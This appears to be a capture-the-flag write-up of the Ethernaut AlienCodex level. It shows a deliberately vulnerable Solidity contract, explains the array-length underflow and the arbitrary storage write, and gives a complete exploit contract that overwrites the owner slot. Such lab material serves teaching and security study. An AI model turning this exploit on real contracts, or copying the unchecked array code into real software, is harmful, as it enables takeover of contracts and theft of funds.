<div align="center">

# AlienCodex

</div>



**AlienCodex (Vulnerable Code) :**


<details>
<summary>Code</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}


```

</details>

---------

**Approach and Exploit Method Including Code :** 

1. **Understand the contract**

   - `AlienCodex` maintains a dynamic `bytes32[] codex` array and an `owner` from `Ownable`.  
   - Users must first call `makeContact()` to set `contact = true` before using `record()`, `retract()`, or `revise()`.  
   - `retract()` decreases `codex.length` without bounds checks, allowing **underflow**.  
   - `revise(i, _content)` writes to `codex[i]` without validating the index, which can be abused to overwrite **any storage slot**, including slot 0 where `owner` is stored.

2. **Vulnerability Highlight (key part)**


```solidity
function retract() public contacted {
    codex.length--; // underflow possible — can wrap to 2**256 - 1
}

function revise(uint256 i, bytes32 _content) public contacted {
    codex[i] = _content; // arbitrary storage overwrite if i is large
}
```


## Exploit Code

```Solidity

contract AlienCodexExploit {
    function attack(address _alienCodex) external {
        // Cast to the interface
        AlienCodex alienCodex = AlienCodex(_alienCodex);
        
        // Step 1: Make contact
        alienCodex.makeContact();
        
        // Step 2: Cause underflow
        alienCodex.retract();
        
        // Step 3: Calculate index to overwrite slot 0
        uint256 arrayStart = uint256(keccak256(abi.encode(uint256(1))));
        uint256 index = (2**256 - 1) - arrayStart + 1;
        
        // Step 4: Overwrite owner with our address
        bytes32 newOwner = bytes32(uint256(uint160(msg.sender)));
        alienCodex.revise(index, newOwner);
    }
}

interface AlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
    function owner() external view returns (address);
}


```

---


